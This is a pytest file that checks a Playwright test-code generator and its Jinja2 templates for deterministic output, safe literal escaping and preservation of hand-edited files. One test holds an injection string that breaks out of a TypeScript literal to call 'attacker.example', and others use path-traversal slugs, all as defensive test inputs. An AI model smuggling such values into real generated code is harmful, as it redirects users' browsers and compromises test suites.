"""A7 PlaywrightEmitter and L11 TemplateEnvironment.

Byte-stability is load-bearing: if two renders of an unchanged corpus differ, every
file reports as hand-edited and the protection the engineer relies on becomes noise.
"""

from __future__ import annotations

import json

import pytest
from jinja2 import UndefinedError

from tests.fakes import FakeEmittedViewRepository
from tto_testgen.adapters.playwright_emitter import (
    PROJECT_SLUG,
    PlaywrightEmitter,
    digest,
)
from tto_testgen.adapters.templates import TemplateEnvironment, ts_literal, ts_tag


@pytest.fixture(scope="module")
def env():
    return TemplateEnvironment()


@pytest.fixture()
def emitter(tmp_path, env):
    return PlaywrightEmitter(tmp_path / "automation", env)


def case(seq=1, *, title="Reject an empty basket", item="CI-CHECKOUT-00001", tags=None):
    return {
        "id": f"TC-CHECKOUT-{seq:05d}",
        "title": title,
        "tags": json.dumps(tags if tags is not None else ["checkout", "boundary"]),
        "coverage_item_id": item,
        "preconditions": "A signed-in customer",
        "steps": [
            {"ordinal": 1, "action": "Open the basket", "expected": "The basket is shown"},
            {"ordinal": 2, "action": "Submit with no items", "expected": "An error is shown"},
        ],
        "trace_links": [{"resolved_jira_key": "PAY-12", "target_ref": "PAY-12"}],
    }


def element(**over):
    base = {"role": None, "accessible_name": None, "label": None, "placeholder": None,
            "text": None, "test_id": None, "locator_chain": "[]",
            "is_verified": 1, "is_fragile": 0}
    return {**base, **over}


# --- L11 -------------------------------------------------------------------------

class TestTemplateEnvironment:
    def test_all_nine_templates_are_packaged(self, env):
        assert len(env.template_names()) == 9

    def test_an_undefined_variable_raises_rather_than_rendering_empty(self, env):
        """StrictUndefined is the setting that matters.

        Jinja2's default renders a missing variable as '', producing a locator that
        matches nothing and still compiles - a failure that surfaces weeks later in
        CI with no visible cause.
        """
        with pytest.raises(UndefinedError):
            env.render("package.json.j2", project_name="x")

    @pytest.mark.parametrize(
        "value,expected",
        [
            ("plain", '"plain"'),
            ('say "hi"', '"say \\"hi\\""'),
            ("line\nbreak", '"line\\nbreak"'),
            ("back\\slash", '"back\\\\slash"'),
            ("tab\there", '"tab\\there"'),
            (None, '""'),
            (True, "true"),
            (42, "42"),
            ("café", '"café"'),
        ],
    )
    def test_ts_produces_a_valid_js_literal(self, value, expected):
        assert ts_literal(value) == expected

    def test_a_quote_cannot_escape_the_string_literal(self):
        """The injection surface. A case title is agent-supplied text landing inside
        a TypeScript string literal."""
        hostile = "'; await page.goto('http://attacker.example'); //"
        rendered = ts_literal(hostile)
        assert rendered.startswith('"') and rendered.endswith('"')
        assert json.loads(rendered) == hostile

    def test_tags_are_prefixed_once(self):
        assert ts_tag("checkout") == '"@checkout"'
        assert ts_tag("@checkout") == '"@checkout"'


# --- determinism -------------------------------------------------------------------

class TestDeterminism:
    def test_two_renders_of_the_same_cases_are_identical(self, emitter):
        cases = [case(1), case(2, title="Accept one item")]
        assert emitter.render_spec("checkout", "Checkout", cases) == emitter.render_spec(
            "checkout", "Checkout", cases
        )

    def test_render_is_independent_of_input_order(self, emitter):
        a, b = case(1), case(2, title="Accept one item")
        assert digest(emitter.render_spec("checkout", "Checkout", [a, b])) == digest(
            emitter.render_spec("checkout", "Checkout", [b, a])
        )

    def test_page_object_render_is_independent_of_element_order(self, emitter):
        one = element(role="button", accessible_name="Place order")
        two = element(label="Quantity")
        screen = {"screen_name": "checkout", "screen_route": "/basket"}
        assert emitter.render_page_object(screen, [one, two]) == emitter.render_page_object(
            screen, [two, one]
        )

    def test_imports_are_sorted_not_set_ordered(self, emitter):
        """Python's set order is stable within a process and not across them.

        An unsorted set would render identically all day and differently tomorrow -
        which looks like a hand-edit on a file nobody touched.
        """
        imports = ["import { B } from '../pages/b.page';",
                   "import { A } from '../pages/a.page';"]
        out = emitter.render_spec("checkout", "Checkout", [case()], page_imports=imports)
        assert out.index("a.page") < out.index("b.page")

    def test_no_timestamp_run_id_or_absolute_path_is_rendered(self, emitter):
        content = emitter.render_spec("checkout", "Checkout", [case()])
        content += "".join(c for _, c in emitter.render_scaffold())
        assert "run_id" not in content
        assert "/Users/" not in content and "/private/" not in content
        assert "2026-" not in content


# --- the standard the templates carry -----------------------------------------------

class TestGeneratedStandard:
    def test_no_fixed_wait_is_ever_rendered(self, emitter):
        """FR-AUT-09. Asserted over output, not over templates: a forbidden fragment
        assembled from two harmless halves would pass a template lint."""
        content = emitter.render_spec("checkout", "Checkout", [case()])
        content += "".join(c for _, c in emitter.render_scaffold())
        for forbidden in ("waitForTimeout", "setTimeout", "sleep("):
            assert forbidden not in content

    def test_no_xpath_is_ever_rendered(self, emitter):
        screen = {"screen_name": "checkout"}
        content = emitter.render_page_object(
            screen,
            [element(locator_chain=json.dumps(["//div[3]/button"])),
             element(role="button", accessible_name="Pay")],
        )
        assert "//div" not in content
        assert "getByRole" in content

    def test_every_test_carries_its_case_id_jira_key_and_tags(self, emitter):
        content = emitter.render_spec("checkout", "Checkout", [case()])
        assert "TC-CHECKOUT-00001" in content
        assert '"PAY-12"' in content
        assert '"@checkout"' in content and '"@boundary"' in content

    def test_tags_are_the_cases_own_tags_not_invented(self, emitter):
        content = emitter.render_spec("checkout", "Checkout", [case(tags=["smoke"])])
        assert '"@smoke"' in content
        assert '"@checkout"' not in content

    def test_the_config_names_both_reporters(self, emitter):
        config = dict(emitter.render_scaffold())["playwright.config.ts"]
        assert "'html'" in config and "'junit'" in config

    def test_no_environment_url_or_credential_is_a_literal(self, emitter):
        scaffold = dict(emitter.render_scaffold())
        assert "process.env.TAAS_BASE_URL" in scaffold["playwright.config.ts"]
        env_example = scaffold[".env.example"]
        for line in env_example.splitlines():
            if "=" in line and not line.startswith("#"):
                assert line.endswith("="), f"{line!r} carries a value"

    def test_the_playwright_version_is_pinned_exactly(self, tmp_path, env):
        emitter = PlaywrightEmitter(tmp_path, env, playwright_version="1.49.1")
        package = dict(emitter.render_scaffold())["package.json"]
        assert '"@playwright/test": "1.49.1"' in package
        assert "^" not in package and "~" not in package

    def test_the_api_spec_uses_the_shared_fixture(self, emitter):
        content = emitter.render_spec("checkout", "Checkout", [case()], api=True)
        assert "from '../fixtures/auth'" in content
        assert "async ({ api })" in content


# --- three-outcome emission --------------------------------------------------------------

class TestEmission:
    def test_a_first_write_reports_written(self, emitter, tmp_path):
        views = FakeEmittedViewRepository()
        path = emitter.spec_path("checkout")
        assert emitter.emit_file(path, "content", "checkout", views) == "written"
        assert path.read_text(encoding="utf-8") == "content"

    def test_an_unchanged_rewrite_reports_unchanged(self, emitter):
        views = FakeEmittedViewRepository()
        path = emitter.spec_path("checkout")
        emitter.emit_file(path, "content", "checkout", views)
        assert emitter.emit_file(path, "content", "checkout", views) == "unchanged"

    def test_a_hand_edited_file_is_skipped_and_preserved(self, emitter):
        views = FakeEmittedViewRepository()
        path = emitter.spec_path("checkout")
        emitter.emit_file(path, "original", "checkout", views)
        path.write_text("edited by the engineer", encoding="utf-8")
        assert emitter.emit_file(path, "regenerated", "checkout", views) == "hand_edited"
        assert path.read_text(encoding="utf-8") == "edited by the engineer"

    def test_a_hand_edited_config_survives_a_corpus_change(self, emitter):
        """The common case: tuning playwright.config.ts is the first thing an
        engineer does, and reverting it would surface as a mysterious CI failure."""
        views = FakeEmittedViewRepository()
        path = emitter.path_for("playwright.config.ts")
        emitter.emit_file(path, "generated", PROJECT_SLUG, views)
        path.write_text("retries: 5", encoding="utf-8")
        assert emitter.emit_file(path, "regenerated", PROJECT_SLUG, views) == "hand_edited"
        assert path.read_text(encoding="utf-8") == "retries: 5"

    def test_automation_files_are_recorded_with_their_kind(self, emitter):
        views = FakeEmittedViewRepository()
        emitter.emit_file(emitter.spec_path("checkout"), "x", "checkout", views)
        stored = next(iter(views.store.values()))
        assert stored["kind"] == "automation"


# --- paths ------------------------------------------------------------------------------

@pytest.mark.parametrize("slug", ["../etc", "/abs", "has space", "Upper", "", "a/b", ".."])
def test_an_unsafe_slug_is_refused(emitter, slug):
    with pytest.raises(ValueError):
        emitter.spec_path(slug)
    with pytest.raises(ValueError):
        emitter.page_path(slug)


def test_files_are_written_under_the_destination(emitter, tmp_path):
    assert str(tmp_path / "automation") in str(emitter.spec_path("checkout"))
